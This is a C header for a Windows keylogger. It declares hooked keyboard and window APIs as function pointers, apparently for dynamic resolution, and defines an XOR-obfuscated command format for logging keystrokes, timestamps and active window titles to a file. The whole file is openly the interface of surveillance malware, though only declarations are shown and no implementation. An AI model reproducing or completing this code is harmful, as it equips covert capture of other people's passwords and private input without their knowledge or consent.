#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#include <stdio.h>
#include <windows.h>

#define KEYLOGGER_BLOCK_CPU_PROTECT() Sleep(100)

#define KEYLOGGER_MAX_PAUSE 10
#define KEYLOGGER_SIGIL_LEN 4
#define KEYLOGGER_SIGIL "\xF0\xE9\xF6\x66"

#define KEYLOGGER_CMD_XOR_KEY 0xB
#define KEYLOGGER_CMD_KEY 0x2 //[DATA|KEY]
#define KEYLOGGER_CMD_PRG 0xC //[CMD|LEN|DATA}
#define KEYLOGGER_CMD_TIME 0x5 //[CMD|TIME]

typedef HHOOK (WINAPI *__SetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL (WINAPI *__GetMessageA)(LPMSG, HWND, UINT, UINT);
typedef BOOL (WINAPI *__TranslateMessage)(const MSG *);
typedef LONG (WINAPI *__DispatchMessageA)(const MSG *);
typedef SHORT (WINAPI *__GetKeyState)(int);
typedef LRESULT (WINAPI *__CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef HWND (WINAPI *__GetForegroundWindow)(void);
typedef int (WINAPI *__GetWindowTextA)(HWND, LPSTR, int);

extern int keylogger_IsBlocking;
extern int keylogger_IsRunning;
extern char* keylogger_FilePath;
extern char keylogger_LastFocusTitle[0xFF];
extern long keylogger_LastTime;
extern unsigned char keylogger_SpecKey; //is shift; ctrl; caps on or off
extern unsigned short keylogger_LastKey;
extern unsigned int keylogger_LastError;
extern FILE* keylogger_F;

extern void keylogger_Start(void);
extern void keylogger_Setup(void);
extern int keylogger_GetFile(void);

#endif